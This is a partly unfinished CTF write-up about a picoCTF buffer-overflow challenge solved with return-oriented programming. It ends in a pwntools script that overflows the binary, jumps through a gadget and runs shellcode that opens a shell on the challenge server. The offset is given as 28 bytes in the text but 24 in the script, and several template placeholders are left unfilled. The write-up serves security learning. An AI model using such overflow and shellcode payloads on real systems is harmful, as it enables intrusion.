# CTF Write-Up: [Challenge Name][Challenge Type]

## Description
>What's ROP?
Can you exploit the following program to get the flag? Download source.


## Flag
The flag you obtained after solving the challenge. (e.g., `picoCTF{5n47ch_7h3_5h311_4cbbb771}`)

## Difficulty
- **Difficulty Level:** hard

## Tools Used
- gdb

## Write-Up

### Preparatory Phase
As per the name of the challenge I had to research how to conduct return-oriented programming (ROP). It a relatively intermediate-level skill which builds upon the the skills I've learnt in buffer overflow exploitaiton. The following step by step was as summary of [this](#https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing). The basic premise of this is to chain together so-called gadgets which enables us as the attacker to force the program to jump to un-intended areas of code. Gadgets are an instruction which typically ends with a `ret` for example: `pop rdi; ret.`

1. Find the offset to the return address via `gdb`
2. 




### Attack Phase
Using `checksec vuln` I was able to ascertain important information such as the binary's architecture and protections. An interesting discovery was that the stack was exectuable. Therefore I suspected we could execute our own shell code 
![alt text](images/image.png)

I now used `gdb` to find the offset which was determined to be 28 bytes. Therefore we need 28 bytes to reach the return pointer which for a 32-bit system is the `eip` register. 

### Final Solution/Payload
``` py
from pwn import *

local = False
offset = 24
short_jump = b'\xeb\x08\x90\x90'
payload = b'A' * offset
payload += short_jump
payload += p32(0x0805333b)
payload += b'\x90'*100
payload += asm(shellcraft.i386.linux.sh())

if local:
    io = process('./vuln')
else:
    io = remote('saturn.picoctf.net', 60948)
io.sendline(payload)
io.interactive()
```

### Lessons Learnt
I had to first understand what return oriented programming was. By extension this required understanding what [gadgets] were. 
## References
- Link to any external resources, write-ups, or documentation that were helpful in solving the challenge.

